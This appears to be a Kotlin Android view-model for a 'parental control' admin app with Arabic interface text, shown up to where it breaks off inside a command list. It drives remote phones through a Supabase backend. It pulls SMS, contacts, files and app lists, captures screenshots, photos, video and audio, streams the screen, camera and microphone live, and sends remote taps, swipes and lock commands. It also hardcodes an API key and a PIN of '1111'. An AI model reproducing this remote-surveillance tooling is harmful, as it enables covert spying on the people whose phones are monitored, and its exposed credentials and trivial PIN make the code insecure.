package com.example.admin

import android.app.Application
import android.content.Context
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.ToneGenerator
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream

enum class CommandStepStatus {
    IDLE,
    RUNNING,
    SUCCESS,
    FAILED
}

data class ActiveCommandProgress(
    val commandType: String,
    val commandLabel: String,
    val sendStatus: CommandStepStatus = CommandStepStatus.IDLE,
    val sendError: String? = null,
    val executionStatus: CommandStepStatus = CommandStepStatus.IDLE,
    val executionError: String? = null,
    val resultMessage: String? = null,
    val startTimestamp: Long = System.currentTimeMillis(),
    val responseData: Any? = null
)

class AdminViewModel(application: Application) : AndroidViewModel(application) {
    private val connector = SupabaseAdminConnector()

    // PIN protection state
    private val _isUnlocked = MutableStateFlow(false)
    val isUnlocked: StateFlow<Boolean> = _isUnlocked.asStateFlow()

    // Devices & Loading states
    private val _devices = MutableStateFlow<List<Device>>(emptyList())
    val devices: StateFlow<List<Device>> = _devices.asStateFlow()

    private val _selectedDeviceToken = MutableStateFlow<String?>(null)
    val selectedDeviceToken: StateFlow<String?> = _selectedDeviceToken.asStateFlow()

    private val _isLoading = MutableStateFlow(false)
    val isLoading: StateFlow<Boolean> = _isLoading.asStateFlow()

    // Device-specific sync states
    private val _smsLogs = MutableStateFlow<List<SmsLog>>(emptyList())
    val smsLogs: StateFlow<List<SmsLog>> = _smsLogs.asStateFlow()

    private val _securityAlerts = MutableStateFlow<List<SecurityAlert>>(emptyList())
    val securityAlerts: StateFlow<List<SecurityAlert>> = _securityAlerts.asStateFlow()

    private val _installedApps = MutableStateFlow<List<InstalledApp>>(emptyList())
    val installedApps: StateFlow<List<InstalledApp>> = _installedApps.asStateFlow()

    private val _fileItems = MutableStateFlow<List<FileItem>>(emptyList())
    val fileItems: StateFlow<List<FileItem>> = _fileItems.asStateFlow()

    private val _fullDeviceFilesMap = MutableStateFlow<List<DeviceFile>>(emptyList())
    private val _deviceFiles = MutableStateFlow<List<DeviceFile>>(emptyList())
    val deviceFiles: StateFlow<List<DeviceFile>> = _deviceFiles.asStateFlow()

    private val _isFilesLoading = MutableStateFlow(false)
    val isFilesLoading: StateFlow<Boolean> = _isFilesLoading.asStateFlow()

    private val _currentPath = MutableStateFlow("/storage/emulated/0")
    val currentPath: StateFlow<String> = _currentPath.asStateFlow()

    // Media and responses states
    private val _screenshots = MutableStateFlow<List<MediaItem>>(emptyList())
    val screenshots: StateFlow<List<MediaItem>> = _screenshots.asStateFlow()

    private val _cameraPhotos = MutableStateFlow<List<MediaItem>>(emptyList())
    val cameraPhotos: StateFlow<List<MediaItem>> = _cameraPhotos.asStateFlow()

    private val _cameraVideos = MutableStateFlow<List<MediaItem>>(emptyList())
    val cameraVideos: StateFlow<List<MediaItem>> = _cameraVideos.asStateFlow()

    private val _audioRecords = MutableStateFlow<List<MediaItem>>(emptyList())
    val audioRecords: StateFlow<List<MediaItem>> = _audioRecords.asStateFlow()

    private val _audioRecordsState = MutableStateFlow<AudioRecordsState>(AudioRecordsState.Loading)
    val audioRecordsState: StateFlow<AudioRecordsState> = _audioRecordsState.asStateFlow()

    private val _audioLoadingUrl = MutableStateFlow<String?>(null)
    val audioLoadingUrl: StateFlow<String?> = _audioLoadingUrl.asStateFlow()

    private val _playingFileUrl = MutableStateFlow<String?>(null)
    val playingFileUrl: StateFlow<String?> = _playingFileUrl.asStateFlow()

    private val _allMediaFiles = MutableStateFlow<List<MediaItem>>(emptyList())
    val allMediaFiles: StateFlow<List<MediaItem>> = _allMediaFiles.asStateFlow()

    private val _contacts = MutableStateFlow<List<Contact>>(emptyList())
    val contacts: StateFlow<List<Contact>> = _contacts.asStateFlow()

    private val _commandResponse = MutableStateFlow<Triple<String, String, Long>?>(null)
    val commandResponse: StateFlow<Triple<String, String, Long>?> = _commandResponse.asStateFlow()

    private val _availableSounds = MutableStateFlow<List<String>>(emptyList())
    val availableSounds: StateFlow<List<String>> = _availableSounds.asStateFlow()

    private val _statusMessage = MutableStateFlow<String?>(null)
    val statusMessage: StateFlow<String?> = _statusMessage.asStateFlow()

    private val _liveStreamState = MutableStateFlow<LiveStreamState?>(null)
    val liveStreamState: StateFlow<LiveStreamState?> = _liveStreamState.asStateFlow()
    
    private val _micStreamState = MutableStateFlow<MicStreamState>(MicStreamState())
    val micStreamState: StateFlow<MicStreamState> = _micStreamState.asStateFlow()
    
    val liveStreamFrames = kotlinx.coroutines.flow.MutableSharedFlow<ByteArray>(
        extraBufferCapacity = 60, 
        onBufferOverflow = kotlinx.coroutines.channels.BufferOverflow.DROP_OLDEST
    )

    private var liveAudioPlayer: LiveAudioPlayer? = null

    private val _cameraStreamState = MutableStateFlow<CameraStreamState?>(null)
    val cameraStreamState: StateFlow<CameraStreamState?> = _cameraStreamState.asStateFlow()

    private val _activeCommandProgress = MutableStateFlow<ActiveCommandProgress?>(null)
    val activeCommandProgress: StateFlow<ActiveCommandProgress?> = _activeCommandProgress.asStateFlow()

    private val _directScreenshotToShow = MutableStateFlow<MediaItem?>(null)
    val directScreenshotToShow: StateFlow<MediaItem?> = _directScreenshotToShow.asStateFlow()

    private val _directPhotoToShow = MutableStateFlow<MediaItem?>(null)
    val directPhotoToShow: StateFlow<MediaItem?> = _directPhotoToShow.asStateFlow()

    private val _isRefreshing = MutableStateFlow(false)
    val isRefreshing: StateFlow<Boolean> = _isRefreshing.asStateFlow()

    fun clearActiveCommandProgress() {
        _activeCommandProgress.value = null
    }

    fun clearDirectScreenshot() {
        _directScreenshotToShow.value = null
    }

    fun clearDirectPhoto() {
        _directPhotoToShow.value = null
    }

    // Polling and synchronization jobs
    private var syncJob: Job? = null
    private var streamPollingJob: Job? = null
    private var realtimeStreamer: SupabaseRealtimeStreamer? = null
    private var lastKnownAlertTime = 0L

    private val _devicesWebSocketConnected = MutableStateFlow(false)
    val devicesWebSocketConnected: StateFlow<Boolean> = _devicesWebSocketConnected.asStateFlow()

    private val _onlineDeviceTokens = MutableStateFlow<Set<String>>(emptySet())
    val onlineDeviceTokens: StateFlow<Set<String>> = _onlineDeviceTokens.asStateFlow()

    private val _websocketReceivedEvents = MutableStateFlow<List<String>>(emptyList())
    val websocketReceivedEvents: StateFlow<List<String>> = _websocketReceivedEvents.asStateFlow()

    private val _deviceHeartbeats = MutableStateFlow<Map<String, Long>>(emptyMap())
    val deviceHeartbeats: StateFlow<Map<String, Long>> = _deviceHeartbeats.asStateFlow()

    private val _devicesCheckingStatus = MutableStateFlow<Set<String>>(emptySet())
    val devicesCheckingStatus: StateFlow<Set<String>> = _devicesCheckingStatus.asStateFlow()

    private fun addWebsocketEvent(event: String) {
        val currentLogs = _websocketReceivedEvents.value.toMutableList()
        val formattedTime = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
        currentLogs.add(0, "[$formattedTime] $event")
        if (currentLogs.size > 50) {
            currentLogs.removeAt(currentLogs.size - 1)
        }
        _websocketReceivedEvents.value = currentLogs
    }

    private fun updateOrAddDeviceRealtime(updatedDevice: Device) {
        val currentList = _devices.value.toMutableList()
        val index = currentList.indexOfFirst { it.id == updatedDevice.id }
        
        // If the database row update explicitly says disconnected, we must trust it and update presence set
        val isExplicitlyDisconnected = updatedDevice.status == "disconnected"
        
        if (isExplicitlyDisconnected) {
            val currentSet = _onlineDeviceTokens.value.toMutableSet()
            currentSet.remove(updatedDevice.id)
            _onlineDeviceTokens.value = currentSet
        }
        
        // Inherit isOnlineOverride from the current tracked presence unless explicitly disconnected
        val isOnlineByPresence = if (isExplicitlyDisconnected) false else _onlineDeviceTokens.value.contains(updatedDevice.id)
        val finalDevice = updatedDevice.copy(
            isOnlineOverride = isOnlineByPresence,
            status = updatedDevice.status
        )
        
        val statusSuffix = if (finalDevice.isOnline) "تم الاتصال" else "تم القطع"
        
        if (index != -1) {
            currentList[index] = finalDevice
            addWebsocketEvent("تحديث جهاز ($statusSuffix): ${finalDevice.name} (البطارية: ${finalDevice.battery}٪، الشبكة: ${finalDevice.networkType ?: "غير معروف"})")
        } else {
            currentList.add(finalDevice)
            addWebsocketEvent("جهاز جديد متصل بالخدمة ($statusSuffix): ${finalDevice.name} (التوكن: ${finalDevice.id})")
        }
        _devices.value = currentList
    }

    // Database URL and status states
    private val prefs = application.getSharedPreferences("admin_prefs", Context.MODE_PRIVATE)
    
    private val _currentDatabaseUrl = MutableStateFlow(
        prefs.getString("db_url", "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com") ?: "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com"
    )
    val currentDatabaseUrl: StateFlow<String> = _currentDatabaseUrl.asStateFlow()

    private val _connectionError = MutableStateFlow<String?>(null)
    val connectionError: StateFlow<String?> = _connectionError.asStateFlow()

    // Audio Player State
    private var mediaPlayer: MediaPlayer? = null
    private var tempAudioFile: File? = null
    private var audioProgressJob: Job? = null

    private val _isAudioPlaying = MutableStateFlow(false)
    val isAudioPlaying: StateFlow<Boolean> = _isAudioPlaying.asStateFlow()

    private val _audioDuration = MutableStateFlow(0)
    val audioDuration: StateFlow<Int> = _audioDuration.asStateFlow()

    private val _audioPosition = MutableStateFlow(0)
    val audioPosition: StateFlow<Int> = _audioPosition.asStateFlow()

    private var anonKey = "YOUR_ANON_KEY"

    private var heartbeatMonitorJob: Job? = null

    init {
        val defaultSupabase = "https://qwtkuzuuskevtptetnvb.supabase.co"
        val defaultKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF3dGt1enV1c2tldnRwdGV0bnZiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk3MDU2NzUsImV4cCI6MjA5NTI4MTY3NX0.FtkcRTFxSIMgZEY0FoJ4nOwAYc0O84zeAT7vji-FHFs"
        val fallbackUrl = prefs.getString("db_url", defaultSupabase) ?: defaultSupabase
        // Note: For real environment, save key properly.
        anonKey = defaultKey
        
        connector.updateConfig(fallbackUrl, anonKey)
        viewModelScope.launch {
            loadAllDevicesAndStartSync()
            delay(1500) // Give WebSocket channel minor time to connect
            refreshAllDevices()
        }
    }


    fun updateDatabaseUrl(url: String) {
        val cleanedUrl = url.trim().removeSuffix("/")
        prefs.edit().putString("db_url", cleanedUrl).apply()
        _currentDatabaseUrl.value = cleanedUrl
        connector.updateConfig(cleanedUrl, anonKey)
        _connectionError.value = null
        // Trigger reload
        loadAllDevicesAndStartSync()
    }

    fun unlockWithPin(pin: String): Boolean {
        return if (pin == "1111") { // Default Parental code is 1111 as requested
            _isUnlocked.value = true
            true
        } else {
            false
        }
    }

    fun lockPIN() {
        _isUnlocked.value = false
    }

    fun clearStatusMessage() {
        _statusMessage.value = null
    }

    fun registerDeviceManually(token: String, name: String) {
        viewModelScope.launch {
            _isLoading.value = true
            val success = connector.registerNewDeviceToken(getApplication(), token, name)
            _isLoading.value = false
            if (success) {
                _statusMessage.value = "تم ربط جهاز الطفل بنجاح!"
                loadAllDevicesAndStartSync()
                selectDevice(token)
            } else {
                _statusMessage.value = "فشل ربط جهاز الطفل، تأكد من الاتصال بقاعدة البيانات."
            }
        }
    }

    fun selectDevice(token: String) {
        _selectedDeviceToken.value = token
        // Reset device dependent views
        _smsLogs.value = emptyList()
        _securityAlerts.value = emptyList()
        _installedApps.value = emptyList()
        _fileItems.value = emptyList()
        _fullDeviceFilesMap.value = emptyList()
        _deviceFiles.value = emptyList()
        _currentPath.value = "/storage/emulated/0"
        _screenshots.value = emptyList()
        _cameraPhotos.value = emptyList()
        _audioRecords.value = emptyList()
        _commandResponse.value = null
        _liveStreamState.value = null
        _cameraStreamState.value = null
        streamPollingJob?.cancel()
        stopAudio()
        
        streamPollingJob = viewModelScope.launch {
            while (true) {
                try {
                    val streamState = connector.getLiveStreamState(token)
                    if (streamState != null && (streamState.isActive || !streamState.streamUrl.isNullOrBlank())) {
                        if (_liveStreamState.value?.image != streamState.image || _liveStreamState.value?.isActive != streamState.isActive || _liveStreamState.value?.timestamp != streamState.timestamp) {
                            _liveStreamState.value = streamState.copy(isLoading = false)
                        }
                    } else if (streamState != null && !streamState.isActive && _liveStreamState.value?.isActive == true) {
                        _liveStreamState.value = streamState.copy(isLoading = false)
                    }

                    val camState = connector.getCameraStreamState(token)
                    if (camState != null && (camState.isActive || !camState.streamUrl.isNullOrBlank())) {
                        if (_cameraStreamState.value?.image != camState.image || _cameraStreamState.value?.isActive != camState.isActive || _cameraStreamState.value?.timestamp != camState.timestamp) {
                            _cameraStreamState.value = camState.copy(isLoading = false)
                        }
                    } else if (camState != null && !camState.isActive && _cameraStreamState.value?.isActive == true) {
                        _cameraStreamState.value = camState.copy(isLoading = false)
                    }
                } catch(e: Exception) {}
                delay(1000)
            }
        }

        // Trigger intermediate fetch
        triggerSingleDeviceFetch(token)
    }

    fun refreshCurrentDevice() {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            _isRefreshing.value = true
            try {
                // Relying on WebSocket for device updates, syncing specific details
                syncCurrentDeviceAll(token)
            } catch(e: Exception) {
                Log.e("AdminViewModel", "Error refreshing", e)
            } finally {
                _isRefreshing.value = false
            }
        }
    }

    private var statusTimeoutJob: Job? = null

    fun refreshAllDevices() {
        statusTimeoutJob?.cancel()
        _isRefreshing.value = true
        _connectionError.value = null
        viewModelScope.launch {
            try {
                // Fetch the latest registered devices list from database first
                val dbDevices = connector.getDiscoveredDevices()
                val currentChecking = dbDevices.map { it.id }.toSet()
                
                // Initialize skeleton checking states
                _devicesCheckingStatus.value = currentChecking
                
                // Expose the fresh list to our StateFlow
                _devices.value = dbDevices
                
                // Send light-weight status check broadcast via our streamer's WS over the single unified channel
                realtimeStreamer?.sendBroadcast(
                    topic = "realtime:device_presence",
                    eventName = "check_status",
                    payload = org.json.JSONObject()
                )
                addWebsocketEvent("تم إرسال طلب فحص الحالة (check_status) إلى الأجهزة 📡 ... جاري فحص الاتصال")

                // Start 5-second timer
                statusTimeoutJob = launch {
                    delay(5000)
                    val remaining = _devicesCheckingStatus.value
                    if (remaining.isNotEmpty()) {
                        val currentList = _devices.value.map { dev ->
                            if (remaining.contains(dev.id)) {
                                dev.copy(
                                    isOnlineOverride = false,
                                    status = "disconnected"
                                )
                            } else {
                                dev
                            }
                        }
                        _devices.value = currentList
                        _devicesCheckingStatus.value = emptySet()
                        addWebsocketEvent("انتهى وقت فحص الاتصال (5 ثواني) ⏱️. الأجهزة التي لم تستجب تظهر غير متصلة الآن 🔴")
                    }
                    _isRefreshing.value = false
                }
            } catch (e: Exception) {
                Log.e("AdminViewModel", "Error in manual refresh status", e)
                _devicesCheckingStatus.value = emptySet()
                _isRefreshing.value = false
                _connectionError.value = "فشل الاتصال: ${e.localizedMessage}"
            }
        }
    }

    private fun ensureDeviceExistsAndOnline(token: String, isOnline: Boolean) {
        val currentList = _devices.value.toMutableList()
        val index = currentList.indexOfFirst { it.id == token }
        val now = System.currentTimeMillis()
        if (index != -1) {
            val dev = currentList[index]
            val becameOffline = dev.isOnline && !isOnline
            currentList[index] = dev.copy(
                isOnlineOverride = isOnline,
                status = if (isOnline) "connected" else "disconnected",
                lastActive = if (becameOffline) now else if (isOnline) now else dev.lastActive
            )
            _devices.value = currentList
        } else {
            // Fetch dynamically from DB
            viewModelScope.launch {
                try {
                    val dbDevices = connector.getDiscoveredDevices()
                    val match = dbDevices.find { it.id == token }
                    val currentListLatest = _devices.value.toMutableList()
                    val latestIndex = currentListLatest.indexOfFirst { it.id == token }
                    if (latestIndex != -1) {
                        val dev = currentListLatest[latestIndex]
                        val becameOffline = dev.isOnline && !isOnline
                        currentListLatest[latestIndex] = dev.copy(
                            isOnlineOverride = isOnline,
                            status = if (isOnline) "connected" else "disconnected",
                            lastActive = if (becameOffline) now else if (isOnline) now else dev.lastActive
                        )
                        _devices.value = currentListLatest
                    } else if (match != null) {
                        currentListLatest.add(match.copy(
                            isOnlineOverride = isOnline,
                            status = if (isOnline) "connected" else "disconnected",
                            lastActive = if (isOnline) now else match.lastActive
                        ))
                        _devices.value = currentListLatest
                    } else {
                        // Create a visual placeholder so the device shows up immediately in the UI!
                        val placeholder = Device(
                            id = token,
                            name = "جهاز طفل (${token.take(8)})",
                            battery = 50,
                            lastActive = now,
                            isOnlineOverride = isOnline,
                            status = if (isOnline) "connected" else "disconnected"
                        )
                        currentListLatest.add(placeholder)
                        _devices.value = currentListLatest
                    }
                } catch (e: Exception) {
                    val currentListLatest = _devices.value.toMutableList()
                    if (currentListLatest.none { it.id == token }) {
                        val placeholder = Device(
                            id = token,
                            name = "جهاز طفل (${token.take(8)})",
                            battery = 50,
                            lastActive = now,
                            isOnlineOverride = isOnline,
                            status = if (isOnline) "connected" else "disconnected"
                        )
                        currentListLatest.add(placeholder)
                        _devices.value = currentListLatest
                    }
                }
            }
        }
    }

    fun loadAllDevicesAndStartSync() {
        // Fetch initially registered devices from DB immediately when starting sync
        viewModelScope.launch {
            try {
                val dbDevices = connector.getDiscoveredDevices()
                val currentSet = _onlineDeviceTokens.value
                val initialList = dbDevices.map { dev ->
                    dev.copy(isOnlineOverride = currentSet.contains(dev.id))
                }
                _devices.value = initialList
                Log.d("AdminViewModel", "Loaded initial devices from database: ${initialList.size}")
            } catch (e: Exception) {
                Log.e("AdminViewModel", "Error fetching initial devices from DB", e)
            }
        }

        realtimeStreamer?.shutdown()
        realtimeStreamer = SupabaseRealtimeStreamer(
            deviceToken = null,
            onDeviceUpdate = { updatedDevice ->
                viewModelScope.launch {
                    updateOrAddDeviceRealtime(updatedDevice)
                }
            },
            onStatusUpdate = { connected ->
                _devicesWebSocketConnected.value = connected
                addWebsocketEvent(if (connected) "تم الاتصال بقناة البث الحي (WebSocket) بنجاح" else "انقطع الاتصال بقناة البث الحي (WebSocket)")
                if (!connected) {
                    _devices.value = emptyList()
                    _onlineDeviceTokens.value = emptySet()
                }
            },
            onPresenceSync = { activeTokens ->
                viewModelScope.launch {
                    _onlineDeviceTokens.value = activeTokens
                    addWebsocketEvent("تزامن الحضور النشط: تم العثور على أجهزة متصلة بالبث: ${activeTokens.size}")
                }
            },
            onPresenceJoin = { token ->
                viewModelScope.launch {
                    val currentSet = _onlineDeviceTokens.value.toMutableSet()
                    currentSet.add(token)
                    _onlineDeviceTokens.value = currentSet
                    addWebsocketEvent("تم انضمام جهاز جديد لقناة البث: (${token})")
                }
            },
            onPresenceLeave = { token ->
                viewModelScope.launch {
                    val currentSet = _onlineDeviceTokens.value.toMutableSet()
                    currentSet.remove(token)
                    _onlineDeviceTokens.value = currentSet
                    addWebsocketEvent("تم مغادرة جهاز لقناة البث: (${token})")
                }
            },
            onHeartbeat = { token ->
                viewModelScope.launch {
                    val currentMap = _deviceHeartbeats.value.toMutableMap()
                    currentMap[token] = System.currentTimeMillis()
                    _deviceHeartbeats.value = currentMap
                    addWebsocketEvent("نبضة مستلمة صامتة (Heartbeat Check Background) من جهاز (${token}) 💓")
                }
            },
            onStatusReply = { token ->
                viewModelScope.launch {
                    val currentlyChecking = _devicesCheckingStatus.value.toMutableSet()
                    if (currentlyChecking.contains(token)) {
                        currentlyChecking.remove(token)
                        _devicesCheckingStatus.value = currentlyChecking
                        addWebsocketEvent("وصل رد استجابة حالة الاتصال (status_reply) من الجهاز (${token}) 🟢")
                    }
                    // Mark as connected (green)
                    val updatedList = _devices.value.map { device ->
                        if (device.id == token) {
                            device.copy(
                                isOnlineOverride = true,
                                status = "connected",
                                lastActive = System.currentTimeMillis()
                            )
                        } else {
                            device
                        }
                    }
                    _devices.value = updatedList
                }
            },
            onCommandReply = { deviceToken, status, message, timestamp ->
                viewModelScope.launch {
                    addWebsocketEvent("رد الأمر مستلم (قناة عامة Websocket) من $deviceToken: $status - $message")
                    val currentSelected = _selectedDeviceToken.value
                    if (deviceToken == currentSelected || deviceToken.isEmpty()) {
                        _commandResponse.value = Triple(status, message, if (timestamp != 0L) timestamp else System.currentTimeMillis())
                        
                        // Check if this is a directory list success
                        if (status == "success" && message.contains("تم مزامنة قائمة ملفات المجلد بنجاح", ignoreCase = true)) {
                            loadDeviceFileMap()
                        }

                        // Try parsing get_sounds reply if status is success and meets the JSON structure
                        if (status == "success" && (message.trim().startsWith("[") || message.trim().startsWith("{"))) {
                            try {
                                val soundsList = mutableListOf<String>()
                                val msgTrim = message.trim()
                                if (msgTrim.startsWith("[")) {
                                    val jsonArray = org.json.JSONArray(msgTrim)
                                    for (i in 0 until jsonArray.length()) {
                                        val item = jsonArray.optString(i)
                                        if (item.isNotBlank()) {
                                            soundsList.add(item)
                                        }
                                    }
                                } else if (msgTrim.startsWith("{")) {
                                    val jsonObject = org.json.JSONObject(msgTrim)
                                    val keys = listOf("sounds", "sound_files", "files")
                                    var arrayFound = false
                                    for (key in keys) {
                                        if (jsonObject.has(key)) {
                                            val jsonArray = jsonObject.optJSONArray(key)
                                            if (jsonArray != null) {
                                                for (i in 0 until jsonArray.length()) {
                                                    val item = jsonArray.optString(i)
                                                    if (item.isNotBlank()) {
                                                        soundsList.add(item)
                                                    }
                                                }
                                                arrayFound = true
                                                break
                                            }
                                        }
                                    }
                                    if (!arrayFound) {
                                        val iterator = jsonObject.keys()
                                        while (iterator.hasNext()) {
                                            soundsList.add(iterator.next())
                                        }
                                    }
                                }
                                if (soundsList.isNotEmpty()) {
                                    _availableSounds.value = soundsList
                                }
                            } catch (e: Exception) {
                                Log.e("AdminViewModel", "Error parsing get_sounds reply", e)
                            }
                        }
                    }
                }
            },
            onLiveStreamUpdate = { deviceToken, state ->
                val currentSelected = _selectedDeviceToken.value
                if (deviceToken == currentSelected) {
                    if (state.isActive || !state.streamUrl.isNullOrBlank()) {
                        _liveStreamState.value = state.copy(isLoading = false)
                    } else if (!state.isActive && _liveStreamState.value?.isActive == true) {
                        _liveStreamState.value = state.copy(isLoading = false)
                    }
                }
            },
            onCameraStreamUpdate = { deviceToken, state ->
                val currentSelected = _selectedDeviceToken.value
                if (deviceToken == currentSelected) {
                    if (state.isActive || !state.streamUrl.isNullOrBlank()) {
                        _cameraStreamState.value = state.copy(isLoading = false)
                    } else if (!state.isActive && _cameraStreamState.value?.isActive == true) {
                        _cameraStreamState.value = state.copy(isLoading = false)
                    }
                }
            },
            onStreamSignal = { deviceToken, type, resolution ->
                val currentSelected = _selectedDeviceToken.value
                if (deviceToken == currentSelected) {
                    if (type == "start") {
                        if (_liveStreamState.value?.isActive != true) {
                            _liveStreamState.value = LiveStreamState(isActive = true, isLoading = false, error = null, streamUrl = "supabase_broadcast")
                        }
                    } else if (type == "stop") {
                        _liveStreamState.value = _liveStreamState.value?.copy(isActive = false)
                    }
                }
            },
            onStreamData = { deviceToken, frameBase64 ->
                val currentSelected = _selectedDeviceToken.value
                if (deviceToken == currentSelected && _liveStreamState.value?.isActive == true) {
                    try {
                        val cleanBase64 = frameBase64.replace("\\s+".toRegex(), "")
                        val bytes = android.util.Base64.decode(cleanBase64, android.util.Base64.DEFAULT)
                        liveStreamFrames.tryEmit(bytes)
                    } catch (e: Exception) {
                        Log.e("AdminViewModel", "Error decoding base64 frame", e)
                    }
                }
            },
            onAudioSignal = { deviceToken, type ->
                val currentSelected = _selectedDeviceToken.value
                if (deviceToken == currentSelected) {
                    if (type == "start") {
                        if (liveAudioPlayer == null) {
                            liveAudioPlayer = LiveAudioPlayer()
                        }
                        liveAudioPlayer?.start()
                        _micStreamState.value = MicStreamState(isActive = true, isLoading = false, error = null)
                    } else if (type == "stop") {
                        liveAudioPlayer?.stop()
                        liveAudioPlayer = null
                        _micStreamState.value = MicStreamState(isActive = false, isLoading = false, error = null)
                    }
                }
            },
            onAudioData = { deviceToken, frameBase64 ->
                val currentSelected = _selectedDeviceToken.value
                if (deviceToken == currentSelected) {
                    liveAudioPlayer?.playAudioData(frameBase64)
                }
            }
        ).apply {
            connect(connector.getRootUrl(), anonKey)
        }

        syncJob?.cancel()
        syncJob = viewModelScope.launch {
            while (true) {
                try {
                    _selectedDeviceToken.value?.let { token ->
                        if (token.isNotBlank()) {
                            // Sync current device details and streams
                            syncCurrentDeviceAll(token)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("AdminViewModel", "Error in sync loop", e)
                    _connectionError.value = e.localizedMessage ?: e.message ?: "فشل الاتصال بخادم قاعدة البيانات"
                }
                delay(12000) // Poll every 12 seconds for non-realtime logs/activities
            }
        }
    }

    private fun triggerSingleDeviceFetch(token: String) {
        viewModelScope.launch {
            if (token.isNotBlank()) {
                try {
                    syncCurrentDeviceAll(token)
                } catch (e: Exception) {
                    Log.e("AdminViewModel", "Error in triggerSingleDeviceFetch: ${e.message}", e)
                }
            }
        }
    }

    private suspend fun syncCurrentDeviceAll(token: String) {
        if (token.isBlank()) return
        // 1. Fetch SMS Logs
        val sms = connector.getSmsLogs(token)
        _smsLogs.value = sms

        // 2. Fetch Installed Apps
        var apps = connector.getInstalledApps(token)
        if (apps.isEmpty()) {
            val lastResp = _commandResponse.value ?: connector.getCommandResponse(token)
            if (lastResp != null) {
                val parsed = parseAppsFromText(lastResp.second)
                if (parsed.isNotEmpty()) {
                    apps = parsed
                }
            }
        }
        _installedApps.value = apps

        // 3. Fetch File System Tree
        var files = connector.getFileSystem(token)
        if (files.isEmpty()) {
            val lastResp = _commandResponse.value ?: connector.getCommandResponse(token)
            if (lastResp != null) {
                val parsed = parseFilesFromTextOrJson(lastResp.second)
                if (parsed.isNotEmpty()) {
                    files = parsed
                }
            }
        }
        _fileItems.value = files

        // 4. Fetch Screenshots
        try {
            _screenshots.value = connector.getScreenshots(token)
        } catch(e: Exception) {
            _statusMessage.value = "خطأ في جلب لقطات الشاشة: ${e.message}"
        }

        // 5. Fetch Photos
        _cameraPhotos.value = connector.getCameraPhotos(token)

        // 6. Fetch Videos
        _cameraVideos.value = connector.getCameraVideos(token)

        // 7. Fetch Audio Records
        _audioRecords.value = connector.getAudioRecords(token)

        // 7.1 Fetch Media Files structure audio records
        try {
            val mediaAudioList = connector.getMediaAudioFiles(token)
            if (mediaAudioList.isEmpty()) {
                _audioRecordsState.value = AudioRecordsState.Empty
            } else {
                _audioRecordsState.value = AudioRecordsState.Success(mediaAudioList)
            }
        } catch (e: Exception) {
            _audioRecordsState.value = AudioRecordsState.Error(e.localizedMessage ?: e.message ?: "خطأ في الاتصال بقاعدة البيانات")
        }

        _allMediaFiles.value = connector.getAllMediaFiles(token)

        // 8. Get last command response
        _commandResponse.value = connector.getCommandResponse(token)

        // 9. Fetch Alerts
        val alerts = connector.getSecurityAlerts(token)
        _securityAlerts.value = alerts
        checkForNewAlert(alerts)

        // 10. Fetch Live Stream state silently (if not already fast-polling)
        if (streamPollingJob?.isActive != true) {
            _liveStreamState.value = connector.getLiveStreamState(token)
        }

        // 11. Fetch Contacts
        _contacts.value = connector.getContacts(token)
    }

    private fun checkForNewAlert(alerts: List<SecurityAlert>) {
        if (alerts.isNotEmpty()) {
            val latest = alerts.first()
            if (latest.timestamp > lastKnownAlertTime) {
                lastKnownAlertTime = latest.timestamp
                // If this is not the first boot load of the ViewModel, ring/vibrate
                triggerAlertNotification()
            }
        }
    }

    private fun triggerAlertNotification() {
        val context = getApplication<Application>().applicationContext
        
        try {
            // 1. Sound BEEP
            ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100)
                .startTone(ToneGenerator.TONE_PROP_BEEP, 150)

            // 2. Vibrate
            @Suppress("DEPRECATION")
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
            vibrator?.let {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    it.vibrate(VibrationEffect.createOneShot(450, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    it.vibrate(450)
                }
            }
        } catch (e: Throwable) {
            Log.e("AdminViewModel", "Error sounding alert feedback", e)
        }
    }

    private fun getCommandArabicLabel(commandType: String): String {
        return when (commandType) {
            "get_sounds" -> "جلب قائمة الأصوات"
            "flash_on" -> "تشغيل فلاش الضوء"
            "flash_off" -> "إيقاف فلاش الضوء"
            "micro_on" -> "بث الميكروفون المباشر"
            "micro_off" -> "إيقاف بث الميكروفون المباشر"
            "lock_device" -> "قفل الهاتف"
            "unlock_device" -> "إلغاء قفل الهاتف"
            "take_screenshot" -> "التقاط لقطة شاشة"
            "take_photo" -> "التقاط صورة كاميرا"
            "take_photo_front" -> "التقاط صورة كاميرا أمامية"
            "take_photo_back" -> "التقاط صورة كاميرا خلفية"
            "record_audio" -> "تسجيل صوتي"
            "get_contacts" -> "جلب جهات الاتصال"
            "get_sms" -> "جلب رسائل SMS"
            "play_remote_sound" -> "تشغيل صوت تنبيه"
            "set_volume" -> "ضبط مستوى الصوت"
            "send_notification" -> "إرسال رسالة تنبيه"
            "remote_click" -> "نقر على الشاشة"
            "remote_swipe" -> "سحب على الشاشة"
            "record_video_front" -> "تسجيل فيديو (أمامي)"
            "record_video_back" -> "تسجيل فيديو (خلفي)"
            "list_apps" -> "جلب قائمة التطبيقات"
            "list_directory" -> "استعراض الملفات"
            "stream_screen", "start_stream" -> "بدء بث الشاشة"
            "stop_stream" -> "إيقاف بث الشاشة"
            "stream_camera_front", "start_camera_stream_front" -> "بدء بث الكاميرا الأمامية"
            "stream_camera_back", "start_camera_stream_back" -> "بدء بث الكاميرا الخلفية"
            "stop_camera_stream" -> "إيقاف بث الكاميرا"
